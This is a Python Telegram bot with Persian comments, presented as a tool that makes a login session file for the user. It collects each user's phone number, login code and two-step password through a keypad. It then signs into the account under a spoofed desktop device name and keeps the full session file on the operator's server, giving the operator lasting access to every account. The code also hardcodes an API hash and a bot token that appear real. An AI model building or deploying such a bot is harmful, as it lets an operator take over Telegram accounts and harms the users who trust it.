import os
import asyncio
from telethon import TelegramClient, events
from telethon.tl.types import Message
from telethon.errors import SessionPasswordNeededError

API_ID = 34855392  # عدد API ID خود را وارد کنید
API_HASH = "5e40d435847009c31c24042e2a3c0d3b"  # API Hash خود را وارد کنید
BOT_TOKEN = "8692323102:AAHVQ5sxZjQk81D8YN5QNItQXMt25vurXqQ"  # توکن ربات خود را اینجا وارد کنید

# دیکشنری برای ذخیره وضعیت کاربران
user_sessions = {}

class SessionBot:
    def __init__(self):
        self.bot = TelegramClient(
            'session_bot',
            API_ID,
            API_HASH,
            device_model="Windows 11",
            system_version="Windows 11",
            app_version="Telegram Desktop",
            lang_code="en",
            system_lang_code="en-US"
        )
        self.temp_clients = {}

    async def start(self):
        await self.bot.start(bot_token=BOT_TOKEN)
        print("ربات راه‌اندازی شد!")

        @self.bot.on(events.NewMessage(pattern='/start'))
        async def start_command(event):
            user_id = event.sender_id
            
            session_name = f"user_{user_id}"
            session_path = os.path.expanduser(f"~/sessions/{session_name}")
            
            client = TelegramClient(
                session_path,
                API_ID,
                API_HASH,
                device_model="Windows 11",
                system_version="Windows 11",
                app_version="Telegram Desktop",
                lang_code="en",
                system_lang_code="en-US"
            )
            
            self.temp_clients[user_id] = {
                'client': client,
                'session_path': session_path,
                'session_name': session_name,
                'step': 'phone',
                'code': '',
                'phone': None,
                'code_length': 5,  # طول پیش‌فرض کد
                'message_id': None  # برای مدیریت پیام‌ها
            }
            
            await event.respond(
                "👋 به ربات ساخت سشن خوش آمدید!\n\n"
                "📱 لطفاً شماره تلفن خود را با کد کشور وارد کنید.\n"
                "مثال: +989123456789"
            )

        @self.bot.on(events.NewMessage)
        async def handle_messages(event):
            if event.is_private and event.text and not event.text.startswith('/'):
                user_id = event.sender_id
                
                if user_id not in self.temp_clients:
                    await event.respond("❗ لطفاً ابتدا /start را بزنید.")
                    return
                
                user_data = self.temp_clients[user_id]
                step = user_data['step']
                client = user_data['client']
                
                try:
                    if step == 'phone':
                        phone = event.text.strip()
                        
                        await client.connect()
                        
                        if not await client.is_user_authorized():
                            try:
                                # ارسال درخواست کد
                                await client.send_code_request(phone)
                                user_data['phone'] = phone
                                user_data['step'] = 'code'
                                user_data['code'] = ''
                                
                                # نمایش پنل کد
                                await self.show_code_panel(event, user_data)
                                
                            except Exception as e:
                                await event.respond(f"❌ خطا: {str(e)}")
                        else:
                            await event.respond("⚠️ این شماره قبلاً تأیید شده است!")
                    
                    elif step == 'code' or step == '2fa':
                        # پردازش callback های پنل کد
                        pass
                
                except Exception as e:
                    await event.respond(f"❌ خطای غیرمنتظره: {str(e)}")

        @self.bot.on(events.CallbackQuery)
        async def handle_callback(event):
            user_id = event.sender_id
            
            if user_id not in self.temp_clients:
                await event.answer("❗ لطفاً ابتدا /start را بزنید.", alert=True)
                return
            
            user_data = self.temp_clients[user_id]
            data = event.data.decode()
            
            if user_data['step'] == 'code' or user_data['step'] == '2fa':
                await self.handle_code_input(event, user_data, data)

        await self.bot.run_until_disconnected()

    async def show_code_panel(self, event, user_data):
        """نمایش پنل شیشه‌ای وارد کردن کد"""
        step = user_data['step']
        code = user_data['code']
        
        # تعیین طول کد بر اساس مرحله
        if step == '2fa':
            code_length = 0  # طول نامحدود برای رمز 2FA
            title = "🔐 رمز عبور دو مرحله‌ای را وارد کنید:"
            placeholder = "••••••••"
        else:
            code_length = user_data.get('code_length', 5)
            title = "📝 کد تأیید را وارد کنید:"
            placeholder = "_" * code_length
        
        # ساخت نمایش کد با جای خالی
        if step == '2fa':
            display_code = "•" * len(code) if code else placeholder
        else:
            display_code = code if code else placeholder
            # پر کردن جای خالی
            if len(code) < code_length:
                display_code = code + "_" * (code_length - len(code))
        
        # ساخت دکمه‌های عددی
        buttons = []
        
        # دکمه‌های 1-9
        row = []
        for i in range(1, 10):
            row.append((str(i), f"code_{i}"))
            if i % 3 == 0:
                buttons.append(row)
                row = []
        
        # ردیف آخر: پاک کردن، 0، تأیید
        buttons.append([
            ("🗑️ پاک کردن", "code_clear"),
            ("0", "code_0"),
            ("✅ تأیید", "code_submit")
        ])
        
        # ساخت کیبورد
        keyboard = []
        for row in buttons:
            keyboard.append([{
                'text': text,
                'callback_data': callback_data
            } for text, callback_data in row])
        
        # متن پیام
        if step == '2fa':
            message_text = f"{title}\n\n`{display_code}`\n\nاز صفحه‌کلید زیر برای وارد کردن رمز استفاده کنید:"
        else:
            message_text = f"{title}\n\n`{display_code}`\n\nاز صفحه‌کلید زیر برای وارد کردن کد استفاده کنید:"
        
        # ویرایش یا ارسال پیام جدید
        if user_data.get('message_id'):
            try:
                await self.bot.edit_message(
                    event.chat_id,
                    user_data['message_id'],
                    message_text,
                    parse_mode='markdown',
                    buttons=keyboard
                )
            except:
                # اگر پیام قبلی وجود نداشت، پیام جدید بفرست
                msg = await event.respond(
                    message_text,
                    parse_mode='markdown',
                    buttons=keyboard
                )
                user_data['message_id'] = msg.id
        else:
            msg = await event.respond(
                message_text,
                parse_mode='markdown',
                buttons=keyboard
            )
            user_data['message_id'] = msg.id
        
        await event.answer()

    async def handle_code_input(self, event, user_data, data):
        """پردازش ورودی‌های پنل کد"""
        code = user_data['code']
        step = user_data['step']
        code_length = user_data.get('code_length', 5)
        
        if data.startswith('code_'):
            action = data.split('_')[1]
            
            if action == 'clear':
                # پاک کردن آخرین رقم
                if code:
                    user_data['code'] = code[:-1]
                await self.show_code_panel(event, user_data)
                await event.answer()
                
            elif action == 'submit':
                # تأیید کد
                if step == '2fa':
                    if len(code) < 1:
                        await event.answer("❗ لطفاً رمز عبور را وارد کنید.", alert=True)
                        return
                    await self.verify_2fa(event, user_data)
                else:
                    if len(code) != code_length:
                        await event.answer(f"❗ لطفاً کد {code_length} رقمی را کامل وارد کنید.", alert=True)
                        return
                    await self.verify_code(event, user_data)
                
            elif action.isdigit():
                # اضافه کردن رقم
                if step == '2fa':
                    # برای 2FA محدودیت طول نداریم
                    user_data['code'] = code + action
                else:
                    if len(code) < code_length:
                        user_data['code'] = code + action
                    else:
                        await event.answer(f"❗ کد {code_length} رقمی کامل شد.", alert=True)
                        return
                await self.show_code_panel(event, user_data)
                await event.answer()

    async def verify_code(self, event, user_data):
        """تأیید کد ورود"""
        code = user_data['code']
        phone = user_data['phone']
        client = user_data['client']
        
        try:
            await client.sign_in(phone, code)
            
            # موفقیت
            await event.answer("✅ تأیید کد با موفقیت انجام شد!", alert=True)
            
            # ارسال فایل سشن
            session_file = user_data['session_path'] + ".session"
            
            if os.path.isfile(session_file):
                # ارسال به Saved Messages
                await client.send_file(
                    "me",
                    session_file,
                    caption=f"📁 فایل سشن: {user_data['session_name']}"
                )
                
                # ارسال به ربات
                await self.bot.send_file(
                    event.chat_id,
                    session_file,
                    caption="✅ ورود موفقیت‌آمیز بود!\n\n📁 فایل سشن شما:"
                )
                
                # پاک کردن پیام پنل
                if user_data.get('message_id'):
                    try:
                        await self.bot.delete_messages(event.chat_id, [user_data['message_id']])
                    except:
                        pass
                
                await event.respond("✅ عملیات با موفقیت انجام شد!\nفایل سشن به Saved Messages و اینجا ارسال شد.")
                
                # پاک کردن داده‌های موقت
                del self.temp_clients[event.sender_id]
            else:
                await event.respond("❌ خطا: فایل سشن ایجاد نشد!")
                
        except SessionPasswordNeededError:
            # نیاز به رمز 2FA
            user_data['step'] = '2fa'
            user_data['code'] = ''
            await event.answer("🔐 نیاز به رمز عبور دو مرحله‌ای!", alert=True)
            await self.show_code_panel(event, user_data)
            
        except Exception as e:
            error_msg = str(e)
            if "PHONE_CODE_INVALID" in error_msg:
                user_data['code'] = ''
                await event.answer("❌ کد وارد شده اشتباه است! دوباره تلاش کنید.", alert=True)
                await self.show_code_panel(event, user_data)
            elif "CODE_EXPIRED" in error_msg:
                await event.answer("❌ کد منقضی شده است. دوباره /start را بزنید.", alert=True)
                del self.temp_clients[event.sender_id]
            else:
                await event.answer(f"❌ خطا: {error_msg}", alert=True)

    async def verify_2fa(self, event, user_data):
        """تأیید رمز 2FA"""
        password = user_data['code']
        client = user_data['client']
        
        try:
            await client.sign_in(password=password)
            
            # موفقیت
            await event.answer("✅ تأیید رمز با موفقیت انجام شد!", alert=True)
            
            # ارسال فایل سشن
            session_file = user_data['session_path'] + ".session"
            
            if os.path.isfile(session_file):
                # ارسال به Saved Messages
                await client.send_file(
                    "me",
                    session_file,
                    caption=f"📁 فایل سشن: {user_data['session_name']}"
                )
                
                # ارسال به ربات
                await self.bot.send_file(
                    event.chat_id,
                    session_file,
                    caption="✅ ورود موفقیت‌آمیز بود!\n\n📁 فایل سشن شما:"
                )
                
                # پاک کردن پیام پنل
                if user_data.get('message_id'):
                    try:
                        await self.bot.delete_messages(event.chat_id, [user_data['message_id']])
                    except:
                        pass
                
                await event.respond("✅ عملیات با موفقیت انجام شد!\nفایل سشن به Saved Messages و اینجا ارسال شد.")
                
                # پاک کردن داده‌های موقت
                del self.temp_clients[event.sender_id]
            else:
                await event.respond("❌ خطا: فایل سشن ایجاد نشد!")
                
        except Exception as e:
            error_msg = str(e)
            if "PASSWORD_HASH_INVALID" in error_msg or "SRP_ID_INVALID" in error_msg:
                user_data['code'] = ''
                await event.answer("❌ رمز عبور اشتباه است! دوباره تلاش کنید.", alert=True)
                await self.show_code_panel(event, user_data)
            else:
                await event.answer(f"❌ خطا: {error_msg}", alert=True)

async def main():
    bot = SessionBot()
    await bot.start()

if __name__ == "__main__":
    os.makedirs(os.path.expanduser("~/sessions"), exist_ok=True)
    asyncio.run(main())
